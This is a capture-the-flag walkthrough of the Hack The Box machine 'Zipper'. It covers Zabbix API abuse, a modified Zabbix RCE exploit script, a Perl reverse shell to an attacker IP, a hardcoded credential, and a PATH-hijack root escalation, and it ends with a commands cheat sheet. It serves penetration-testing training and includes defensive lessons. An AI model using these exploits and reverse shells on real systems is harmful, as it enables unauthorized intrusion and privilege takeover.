# Hack The Box — Zipper: Full Walkthrough

**Machine IP:** 10.129.1.198  
**Attacker IP:** 10.10.16.84  
**Difficulty:** Medium  
**OS:** Linux (Ubuntu)  
**Flags:** User + Root  

---

## Table of Contents

1. [The Hacker Mindset](#the-hacker-mindset)
2. [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
3. [Phase 2 — Web Enumeration](#phase-2--web-enumeration)
4. [Phase 3 — Gaining Access to Zabbix](#phase-3--gaining-access-to-zabbix)
5. [Phase 4 — Remote Code Execution](#phase-4--remote-code-execution)
6. [Phase 5 — Lateral Movement to Zapper](#phase-5--lateral-movement-to-zapper)
7. [Phase 6 — Privilege Escalation to Root](#phase-6--privilege-escalation-to-root)
8. [Lessons Learned](#lessons-learned)

---

## The Hacker Mindset

Before diving in, understand the core loop every penetration tester follows:

```
Enumerate → Identify → Exploit → Pivot → Repeat
```

At every step, ask yourself:
- **What is running here?**
- **What version is it?**
- **Does it trust user input it shouldn't?**
- **What privileges does this process run as?**
- **Can I abuse this to move somewhere I shouldn't be?**

Never skip enumeration. The more you know about the target, the fewer rabbit holes you fall into.

---

## Phase 1 — Reconnaissance

### Step 1: Port Scanning with Nmap

The very first thing we do against any target is find out what services are exposed. We use **nmap** — a network scanner that sends probes to ports and interprets responses to identify open services.

```bash
nmap -sV -sT -sC 10.129.1.198
```

**Flag breakdown:**
- `-sV` — Probe open ports to determine service and version
- `-sT` — TCP connect scan (more reliable than SYN scan without root)
- `-sC` — Run default NSE scripts (grabs banners, checks common vulns)

**Output:**
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

**What this tells us:**
- Port 22 (SSH) is open — potential entry point if we find credentials
- Port 80 (HTTP) is open — a web application to explore
- It's Ubuntu Linux — good to know for exploit compatibility

**Hacker mindset:** Two ports means a small attack surface. SSH usually requires credentials we don't have yet, so HTTP is the obvious starting point. The Apache version (2.4.29) is old — worth noting for potential vulnerabilities later.

---

## Phase 2 — Web Enumeration

### Step 2: Browse to Port 80

Open a browser and visit `http://10.129.1.198`. You'll see the **default Apache2 "It works!" page**. This tells us:
- Apache is installed but no custom web app is served at the root
- There are likely subdirectories hosting the real application
- The admin left the default page — potentially an oversight

**Hacker mindset:** A default Apache page is actually a clue, not a dead end. It means there's almost certainly something hidden in a subdirectory. Time to brute-force directories.

---

### Step 3: Directory Brute Forcing with Gobuster

We use **gobuster** to discover hidden paths by trying thousands of common directory names:

```bash
gobuster dir -u http://10.129.1.198/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Flag breakdown:**
- `dir` — Directory enumeration mode
- `-u` — Target URL
- `-w` — Wordlist to use (medium = ~220,000 entries)

**Output:**
```
/zabbix  (Status: 301)
```

**What this tells us:** There's a `/zabbix` directory — Zabbix is an open-source IT monitoring platform. Finding it changes our entire attack direction.

**Hacker mindset:** Monitoring platforms are goldmines. They have:
- Agent software installed on hosts (which can execute commands)
- Credentials stored in configuration
- APIs that can be abused
- Often misconfigured access controls

---

## Phase 3 — Gaining Access to Zabbix

### Step 4: Explore the Zabbix Login Page

Visit `http://10.129.1.198/zabbix`. You'll see a login page for **Zabbix 3.0.21**.

Notice the **"Sign in as guest"** option. Click it.

**Why guest access matters:** Guest accounts in monitoring systems often have read-only access to dashboards. Even read-only data can reveal hostnames, usernames, running scripts, and infrastructure details — all useful intelligence.

---

### Step 5: Enumerate as Guest

After logging in as guest, navigate to **Monitoring → Latest data**.

You'll see:
```
Zapper's Backup Script    Last value: 0
```

**What this tells us:** There's a user named **zapper** on this system, and they have a backup script registered in Zabbix.

**Hacker mindset:** Usernames are half of a credential pair. When you find a username in one place, immediately try it everywhere — especially as a password. People reuse usernames as passwords more often than you'd think.

---

### Step 6: Try Logging in as Zapper

Go back to the Zabbix login page and try:
- **Username:** `zapper`
- **Password:** `zapper`

**Result:** `GUI access disabled`

This means the credentials work (Zabbix accepted them) but zapper's user group doesn't allow GUI login. This is a configuration restriction, not a wrong password.

**Hacker mindset:** "GUI access disabled" is actually good news — it confirms the credentials are valid. Now we just need to change zapper's group permissions. Since Zabbix has an API, we can do this programmatically without needing GUI access.

---

### Step 7: Authenticate via the Zabbix API

Zabbix exposes a JSON-RPC API at `/zabbix/api_jsonrpc.php`. We can authenticate and perform administrative actions through it even without GUI access.

```bash
curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"user.login","params":{"user":"zapper","password":"zapper"},"id":1}'
```

**Response:**
```json
{"jsonrpc":"2.0","result":"bc701fc98bfcddf6654786652f919abc","id":1}
```

The `result` value is our **auth token** — a session key we include in all future API calls to prove we're authenticated.

**Hacker mindset:** APIs often have weaker access controls than the GUI. A GUI might show a button as greyed out or hidden, but the API endpoint behind it is still callable. Always look for APIs when the GUI blocks you.

---

### Step 8: Create a New User Group with GUI Access

Now we create a new Zabbix user group that allows GUI access:

```bash
curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"usergroup.create",
    "params":{"name":"guiaccess","gui_access":0,"users_status":0},
    "auth":"bc701fc98bfcddf6654786652f919abc",
    "id":2
  }'
```

**Parameters explained:**
- `gui_access: 0` — System default (allows GUI login)
- `users_status: 0` — Users are enabled (not disabled)

**Response:**
```json
{"result":{"usrgrpids":["13"]}}
```

New group created with ID `13`.

**Hacker mindset:** We're not breaking in — we're using a legitimate API with legitimate credentials to change a configuration. This is the line between exploitation and authorized use. On a pentest, this is valid. The vulnerability is that zapper had API access despite being locked out of the GUI.

---

### Step 9: Get Zapper's User ID

```bash
curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"user.get",
    "params":{"output":"extend","filter":{"alias":"zapper"}},
    "auth":"bc701fc98bfcddf6654786652f919abc",
    "id":3
  }'
```

**Response:** `userid: 3`

We need the user ID to modify the user's group membership via the API.

---

### Step 10: Add Zapper to the New Group

```bash
curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"user.update",
    "params":{"userid":"3","usrgrps":[{"usrgrpid":"13"}]},
    "auth":"bc701fc98bfcddf6654786652f919abc",
    "id":4
  }'
```

This removes zapper from the "No access to frontend" group and places them in our new GUI-enabled group.

---

### Step 11: Login to Zabbix GUI as Zapper

Go back to `http://10.129.1.198/zabbix` and login with `zapper:zapper`.

You now have full dashboard access.

Navigate to **Configuration → Hosts** and click on **"Zipper"**. The URL will show:
```
hostid=10106
```

Note this down — we need it for the exploit.

---

## Phase 4 — Remote Code Execution

### Step 12: Understanding the Zabbix RCE Vulnerability

Zabbix allows administrators to create **scripts** that execute on monitored hosts via the Zabbix agent. The agent runs on the target machine and executes commands sent from the Zabbix server.

The exploit (CVE-N/A, ExploitDB #39937) abuses this by:
1. Updating an existing script's command to our payload
2. Executing that script against our target host

The critical setting is `execute_on`:
- `1` = Execute on the **Zabbix server** (a Docker container in this case — a rabbit hole)
- `0` = Execute on the **Zabbix agent** (the actual target machine)

**Hacker mindset:** Always read the code of an exploit before running it. The original exploit used `execute_on: 1` (server), which would give you a shell inside a Docker container — not the host. Understanding what the exploit actually does prevents wasted time.

---

### Step 13: Download and Modify the Exploit

```bash
searchsploit -m 39937
```

We modify it with:
- Correct target IP and Zabbix path
- `zapper:zapper` credentials
- `hostid: 10106`
- `execute_on: 0` in both the `script.update` and `script.execute` payloads
- Convert from Python 2 to Python 3 (`raw_input` → `input`, `print` statements)
- Comment out the final print line (it crashes when the shell spawns)

The final exploit (`39937.py`):

```python
#!/usr/bin/env python3
import requests, json, readline

ZABIX_ROOT = 'http://10.129.1.198/zabbix'
url = ZABIX_ROOT + '/api_jsonrpc.php'
login = 'zapper'
password = 'zapper'
hostid = '10106'

payload = {"jsonrpc":"2.0","method":"user.login",
           "params":{'user':login,'password':password},"auth":None,"id":0}
headers = {'content-type':'application/json'}
auth = requests.post(url, data=json.dumps(payload), headers=headers).json()

while True:
    cmd = input('\033[41m[zabbix_cmd]>>: \033[0m ')
    if cmd == "quit": break

    payload = {"jsonrpc":"2.0","method":"script.update",
               "params":{"scriptid":"1","command":cmd,"execute_on":"0"},
               "auth":auth['result'],"id":0}
    requests.post(url, data=json.dumps(payload), headers=headers)

    payload = {"jsonrpc":"2.0","method":"script.execute",
               "params":{"scriptid":"1","hostid":hostid},
               "auth":auth['result'],"id":0,"execute_on":"0"}
    cmd_exe = requests.post(url, data=json.dumps(payload), headers=headers).json()
#   print(cmd_exe["result"]["value"])
```

---

### Step 14: Get a Reverse Shell

Start a netcat listener on your Kali machine:

```bash
nc -lvnp 1337
```

Run the exploit:

```bash
python3 39937.py
```

At the prompt, the bash reverse shell dies immediately. This is a shell stability issue — the Zabbix agent spawns the process in a way that kills it quickly. Instead, use the **Perl reverse shell** which is more stable:

```
perl -e 'use Socket;$i="10.10.16.84";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Why Perl works when Bash doesn't:** Perl establishes the network connection within its own runtime before spawning the shell, making it independent of the parent process. Bash's `bash -i` relies on the terminal being kept alive by the parent.

You now have a shell:
```
uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
```

---

## Phase 5 — Lateral Movement to Zapper

### Step 15: Find the Hardcoded Password

We're running as the `zabbix` service account. This account is low-privilege and doesn't have access to user home directories. But we spotted earlier that zapper has a backup script in Zabbix. Let's read it:

```bash
cat /home/zapper/utils/backup.sh
```

**Output:**
```bash
#!/bin/bash
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &>/dev/null
```

The `-p` flag in 7z sets a password for the archive. The password `ZippityDoDah` is hardcoded in plaintext.

**Hacker mindset:** Scripts are often overlooked as a source of credentials. Developers hardcode passwords into scripts for convenience, thinking "no one will read this." Always look at scripts, config files, and anything that automates a task — they frequently contain credentials.

---

### Step 16: Switch to Zapper

```bash
su zapper
# Password: ZippityDoDah
```

```bash
cat /home/zapper/user.txt
# cf479[redacted]c809188
```

**User flag captured.**

---

## Phase 6 — Privilege Escalation to Root

### Step 17: Enumerate for Privilege Escalation

The first thing to check when you get a new user shell is what special privileges that user has:

```bash
ls -la /home/zapper/utils/
```

**Output:**
```
-rwsr-sr-x 1 root root 7556 Sep  8 2018 zabbix-service
```

The `s` in `rws` means this is a **SUID binary** — it runs as root regardless of who executes it. This is a massive privilege escalation opportunity.

**Hacker mindset:** SUID binaries are one of the most common privesc paths on Linux. When a binary is SUID root, any code it executes inherits root privileges. If we can control what code it runs — we get root.

---

### Step 18: Analyze the SUID Binary

We use `strings` to extract readable text from the binary without needing to reverse engineer it:

```bash
strings /home/zapper/utils/zabbix-service
```

Key lines in the output:
```
start or stop?: 
start
systemctl daemon-reload && systemctl start zabbix-agent
stop
systemctl stop zabbix-agent
```

The binary calls `systemctl` **without an absolute path** (i.e., it doesn't use `/bin/systemctl`). Instead it relies on the shell's `PATH` environment variable to find `systemctl`.

**This is the vulnerability:** If we can put a fake `systemctl` binary somewhere that appears earlier in the PATH, the SUID binary will execute OUR binary as root.

---

### Step 19: Create a Fake systemctl Binary

We create a malicious `systemctl` that simply spawns `/bin/bash`:

```bash
cat > /home/zapper/utils/systemctl << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /home/zapper/utils/systemctl
```

**Why `/bin/bash`?** When the SUID binary runs as root and calls our fake `systemctl`, it will execute `/bin/bash` with root privileges — giving us an interactive root shell.

---

### Step 20: Hijack the PATH

The `PATH` variable is a list of directories the shell searches when you type a command. By default, `/home/zapper/utils` is not in PATH. We add it to the **front** so it's searched first:

```bash
export PATH=/home/zapper/utils:$PATH
```

Now when any program (including our SUID binary) calls `systemctl`, the shell finds our fake one in `/home/zapper/utils/` before the real one in `/bin/`.

**Hacker mindset:** PATH hijacking is a classic and elegant attack. It works because Unix resolves commands by searching PATH directories in order. The system trusts PATH, but PATH itself isn't protected. Any time a privileged binary calls a command by name rather than full path, it's potentially vulnerable.

---

### Step 21: Execute the SUID Binary

```bash
/home/zapper/utils/zabbix-service
# start or stop?: start
```

**Result:**
```
root@zipper:/# id
uid=0(root) gid=0(root) groups=0(root)
```

We are root.

```bash
cat /root/root.txt
# e24aa[redacted]a6cc
```

**Root flag captured.**

---

## Lessons Learned

### Vulnerability Chain Summary

```
Default Apache page
    → Gobuster reveals /zabbix
        → Guest login reveals username "zapper"
            → zapper:zapper credential works (username = password)
                → API bypasses GUI restriction
                    → Zabbix RCE via agent script execution
                        → Shell as zabbix
                            → Hardcoded password in backup.sh
                                → Shell as zapper (user flag)
                                    → SUID binary calls systemctl without full path
                                        → PATH hijack → root (root flag)
```

---

### Key Takeaways

| Vulnerability | Root Cause | Lesson |
|---|---|---|
| Username = Password | Weak credential hygiene | Never use username as password |
| API bypasses GUI restriction | Incomplete access control | Access controls must apply at the API layer too |
| Hardcoded password in script | Developer convenience | Use secrets managers, never hardcode credentials |
| SUID binary calls command by name | Insecure binary coding | Always use absolute paths in privileged binaries |
| RCE via Zabbix | Over-privileged monitoring agent | Monitoring agents should have least-privilege access |

---

### Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Port and service discovery |
| `gobuster` | Web directory brute-forcing |
| `curl` | Zabbix API interaction |
| `searchsploit` | Find public exploits |
| `python3` | Run and modify the exploit |
| `nc` (netcat) | Receive reverse shell |
| `strings` | Analyze binary without reversing |

---

### Commands Cheat Sheet

```bash
# Recon
nmap -sV -sT -sC <IP>
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Zabbix API
curl -s -X POST http://<IP>/zabbix/api_jsonrpc.php -H "Content-Type: application/json" -d '<JSON>'

# Reverse shells
# Perl (stable):
perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Listener
nc -lvnp <PORT>

# PrivEsc
strings <binary>                          # Find called commands
export PATH=/writable/dir:$PATH           # PATH hijack
cat > /writable/dir/systemctl << 'EOF'    # Fake binary
#!/bin/bash
/bin/bash
EOF
chmod +x /writable/dir/systemctl
```
